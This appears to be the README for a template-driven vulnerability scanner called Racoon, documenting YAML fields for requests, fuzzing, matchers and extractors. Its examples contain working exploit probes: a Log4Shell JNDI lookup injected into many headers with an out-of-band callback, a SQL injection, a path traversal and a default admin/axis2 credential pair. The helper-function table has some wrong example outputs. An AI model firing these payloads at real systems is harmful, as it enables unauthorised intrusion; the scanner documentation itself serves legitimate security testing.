# Racoon template

<p id="menu"> </p>

## I. <a href="#introduction">Introduction</a>
## II. <a href="#components">Template Components</a>
1. <a href="#infor_block"> Info block </a>
2. <a href="#request_block">Requests block </a>
  
    a. <a href="#request_block"> Raw request </a>
  
    b. <a href="#fuzzing"> Fuzzing module </a>
  
    c. <a href="#operator"> Operator </a>

    - <a href="#operator"> Matcher </a>
    - <a href="#exposer">Exposer </a>
    - <a href="#helper">Helper Functions </a>
---
<p id="introduction"> </p>

```
██████╗  █████╗  ██████╗ ██████╗  ██████╗ ███╗   ██╗
██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔═══██╗████╗  ██║
██████╔╝███████║██║     ██║   ██║██║   ██║██╔██╗ ██║
██╔══██╗██╔══██║██║     ██║   ██║██║   ██║██║╚██╗██║
██║  ██║██║  ██║╚██████╗╚██████╔╝╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
```
                                                    
## I. **Introduction**
Racoon is based on the perception of using YAML template file as the input for sent, receive and process data from request. One of the main strength of our tool is customizable template. A knowledge user can create their own template suitable with their need. Those template are written by YAML because this language has a simple and clean syntax and very human-readable.

<p id="components"> </p>

## II. Template Components

<p id="infor_block"> </p>

>### 1. **Info block**
   
Info block provides some basic data fields like: id, name, author, severity, description, remediation, tags,... Info block is dynamic fields, user can add their own fields to provide more information about current template. 
Each template has a unique ID for identifier. ID must not contain spaces and another special character.

Example:

```
info:
  name: Satellian Intellian Aptus Web <= 1.24 RCE
  author: ritikchaddha
  severity: critical
  description: 'Intellian Aptus Web 1.24 allows remote attackers to execute arbitrary OS commands via the Q field within JSON data to the cgi-bin/libagent.cgi URI. NOTE: a valid sid cookie for a login to the intellian
    default account might be needed.'
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-7980
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-7980
    cwe-id: CWE-78
  metadata:
    shodan-query: http.title:"Intellian Aptus Web"
  tags: satellian,rce,cve,cve2020,intellian,aptus
```
<a href="#menu"> Back to main menu </a>

<p id="request_block"> </p>

> ### 2. **Request block**
>> **a. Raw request**:
Multiple requests can be made from only one single template. Requests block specifies the start of the requests for the template.

```
requests:
```

#### **Method**
<h1 id="test"></h1>
Those request method can be GET, POST, PUT, DELETE,...

```
requests:
  - request: #Method is specific in front of each request
      - |
        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}
```

**Redirect**

---

This field decides whether current requests can be redirect or not. By default, redirects are not allowed(it brings false value). However, if user want to redirect, it can be turn on with **redirects: true**.

```
requests:
  - request:
      - |
        POST /admin/?n=language&c=language_general&a=doExportPack HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        appno= 1 union SELECT 98989*443131,1&editor=cn&site=web

    redirects: true
```

**Path**

---
Multiple path can be placed in single request.
Those variables start with *{{* and end with *}}*, case-sensitive and are used in case you want to change the urls entered from the user.

```
Sample URL: https://testpage.com:8081/login/login.php

{{BaseURL}}: https://testpage.com:8081/login/login.php

{{RootURL}}: https://testpage.com:8081

{{Hostname}}: testpage.com:8081

{{Host}}: testpage.com

{{Port}}: 8081

{{Path}}: /login

{{Scheme}}: https

{{FullPath}}: /login/login.php
```

**Session**

---

**cookie-reuse:true** 
By default cookie will be expired after request is finished. To maintain cookie between series of request user can use this field below.
```
cookie-reuse: true
```
**Request Condition**

---

Request condition is used when user want to check for complex condition between multiple requests. 
The matcher can be initialized by adding *req-condition: true* and **HTTP respons code** are specific in the *dsl* field with respective attributes: **status_code_1, status_code_2, status_code_3, [other condition], etc.**
Look at an example below to understand more about declarations

```
req-condition: true
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 302 && status_code_2 == 200 && status_code_3 == 200'
          - 'contains(body_2, "[zm_gallery id=")'
        condition: and
```

```
info:
  id: CVE-2021-44228
  name: Apache Log4j2 Remote Code Injection
  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea
  severity: critical
  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
  reference:
    - https://logging.apache.org/log4j/2.x/security.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
  tags: cve,cve2021,rce,oast,log4j,injection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.00
    cve-id: CVE-2021-44228
    cwe-id: CWE-502

requests:
  - request:
      - |
        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
        Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
        Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
        Access-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
        Access-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
        Authentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
        Authentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
        Cookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
        Location: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}
        Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
        Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
        Upgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
        User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
        X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
        X-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
        X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
        X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
        X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
        Content-Type: application/json
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output

    extractors:
      - type: kval
        kval:
          - interactsh_ip # Print remote interaction IP in output

      - type: regex
        part: interactsh_request
        group: 2
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output

      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
```
<a href="#menu"> Back to main menu </a>

<p id="fuzzing"></p>

>> **b. Fuzzing**:
---
Racoon supports running various type of payloads in multiple format. User can perform batteringram, pitchfork and clusterbomb attacks depends on their need. Those wordlists for these attacks needs to be defined during the request definition under the Payload field.

Attack mode:
- batteringram:
  This uses a single set of payload, iterates through it and places the same payload value in all positions.
- pitchfork:
  This use multiple payload set. It loops through all payload sets at the same time and places each payload in each position respectively.
- clusterbomb:
  This use multiple payload set The clusterbomb attack tries all different combinations of payload like **pitchfork**. But when it loops through the payload sets, it tries all combinations.
  ==> This attack type is useful for brute-force attack..

```
payloads:
      username:
        - admin
      password:
        - axis2
    attack: pitchfork
```

>> **c. Operator**

<p id="operator"> </p>

### **Matcher**:

---

This field contains different type of comparisons to support analysis responses in any case. Basically, there are 5 type of matchers: status, word, regex, dsl, time.

In real case, Word and Regex matchers can be configured later depend on user's needs.

*dsl* matcher can be used in combination of many complex expressions with helper functions to perform matching process.

```
matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_1, "htmoffice operate")'
          - 'contains(body_2, "Windows IP")'
        condition: and
```

**condition:** By default, it has value OR. User can decide it's value later.

### Matcher condition:

---

This field is used when user want to combine results from machers of all requests (in case using multiple requests)

```
requests:
  - method: GET
    path:
      - '{{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php'

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<?php"
          - "login_met_cookie($metinfo_admin_name);"
        condition: and

```
<a href="#menu"> Back to main menu </a>

### **Exposer**:

---

Extractors can be used to extract and display results from the match of the response handler.

Our tool support two type of extractors:
- regex - extract data from response based on a Regular Expression
- kval - extract key: value/key=value formatted data from Response Header/Cookie.
- json - extract data from JSON based response in JQ like syntax.
- xpath - extract xpath based data from HTML Response
Example extractor for HTTP Response body using regex.

```
Example REGEX
```

kval example to extract content-type header from HTTP Response.

```
Example KVAL
```

In real case, content-type will be replaced with content_type because kval extractor does not accept dash (-) as input.


A json example to extract value of **name**, **author**, etc.

```
Example JSON
```


A xpath extractor example to extract value from HTML response.

```
example of xpath
```

**Dynamic extractor**

---

Another type of extractor is Dynamic extractor. It can be used to capture values after performing the analysis response. 

```
extractors:
      - type: regex
        name: windows_working_path
        internal: true
        group: 1
        regex:
          - ".?.?\\\\.*\\\\showenv"
```
In this example above, the value matched the regex field is going to be stored in the variable named *windows_working_path* and if user want to use that variable later in another case, *internal: true* must be placed in extractors field.
Another optional variable *group* can be use to grab Extracted Value more accurately.

```
group: 0 (full match - by default are not specified)
group: 1 (first match)
group: 2 (second match)
...
And so on.
```

**OOB Testing**

---

Racoon supports using the interact.sh API to achieve OOB based vulnerability scanning.

**Interactsh Placeholder**

---

**{{interactsh-url}}** placeholder is used in both http and https in network requests.

Each request is provided each unique interact.sh URLs.

```
- request:
      - |
        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}
```

**Interactsh Matchers**

---

Interactsh interactions can be used with word, regex or dsl matcher/extractor

> interactsh_protocol: dns, http, smtp. 
```
matchers:
  - type: word
    part: interactsh_protocol
    words:
      - "dns"
```

>interactsh_request: the request that the interact.sh server received
```
exposer:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
      - 'GET \/([a-z-]+) HTTP'
```
>interactsh_response: the response that the interact.sh server sent to the client


**Preprocessors**

---

Pre-processors can be specified globally in the template to generate a **random ids** for each template run.

> **randstr**: random ID. This will always contain the same value can be used anywhere in the template. 

randstr can be used within matchers to match the inputs from user.

```
requests:
  - request:
      - |
        PUT /fileserver/test.txt HTTP/1.1
        Host: {{Hostname}}

        {{randstr}}
      - |
        GET /fileserver/test.txt HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1==204"
          - "status_code_2==200"
          - "contains((body_2), '{{randstr}}')"
        condition: and
```
<a href="#menu"> Back to main menu </a>

<p id="helper"> </p>

### **Helper Function**:

---

|Function |Description |Example |
|--- | --- | ---|
|base64(argument) [string] |Encode a given string to base64| base64("Hello") ==> SGVsbG8gd29ybGQ=
|base64_decode(argument) [string]|Decode a given base64 to string| base64_decode("SGVsbG8gd29ybGQ=") ==> "Hello world"|
|concat(arguments_1, arguments_2, arguments_3,...) [string, string, string,...] |Concatenates the given arguments to string |concat("Hello", " ", "world") ==> "Hello world"|
|contains(argument_1, argument_2) [string, string] |Check if a argument_1 contains argument_2 | contains("Hello", "He") ==> true|
|html_escape(argument) [string]| HTML escapes the given input string|html_escape("\<p>Hello world\</p>") ==> \<p>Hello world\</p>|
|html_unescape(argument) [string] |HTML escapes the given input string| html_unescape("\&lt;body\&gt;test\&lt;/body\&gt;") ==> "test"|
|len(argument) [string]| Return the length of the input| len("test") ==> 4|
|regex(pattern, argument) [string, string]| Check if a string contains the specified search pattern|regex("H([a-z]+)o", "Hello") ==> true |
|remove_bad_chars(argument_1, argument_2) [string, string] | Remove the argument_2 from argument_1| remove_bad_chars("Hello", "lo") ==> "Hel"|
|repeat(argument_1, argument_2) [string, int] | Repeat the given string argument_1 with argument_2 times| repeat("He", 5) ==> HeHeHeHeHe |
|replace(given_string, old_string, new_string) [string, string, string]| Replace old_string with new_string in the given_string [string, string, string] | replace("Hello", "He", "Ha") ==> Hallo|
|replace_regex(given_string, regex, new_string) [string, string, string] | Replace old_string(matching the given regex) with old_string | replace_regex("tes0123t", "(\\d+)", "") ==> test|
|reverse(string) [string] | Reverse the given input string| reverse("Hello") ==> olleH|
|to_lower(string) [string]| Transforms the given string into lowercase characters |to_lower("HELLO") ==> hello|
|to_lower("HELLO") [string]| Transforms the given string into uppercase characters| to_upper("hello") // HELLO|
|trim(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string| trim("xyTestxyxy", "xy") ==> "Test"|
|trim_left(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string all about the left| trim_left("xyTestxyxy", "xy") ==> "Testxy"|
|trim_prefix(given_string, cut_string) [string, string] | Returns given_string without the supplied trim_prefix string | trim_prefix("xyTestxyxy", "xy") ==> "Testxyxy"|
|trim_right(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string in the front| trim_prefix("xyTestxyxy", "xy") ==> "Testxyxy"|
|trim_space(given_string) [string, string] | Remove all the space in the given_string| trim_space("Hello   world     ") ==> "Hello world"|
|trim_suffix(input, suffix string) [string, string] | Returns given_string without the supplied suffix string | trim_suffix("xxxxTestxx", "xx") ==> "xxxxTest"|
|url_decode(given_string) [string] | URL decodes the given_string| url_decode("https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dpentest") ==> "https://www.google.com/search?q=pentest" |
|url_encode(input string) [string] | URL encodes the given_string| url_encode("https://www.google.com/search?q=pentest") ==> "https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dpentest" |
|wait_for(given_seconds) [int] | Wait for given_seconds to continue| wait_for(10) ==> true|

<a href="#menu"> Back to main menu </a>
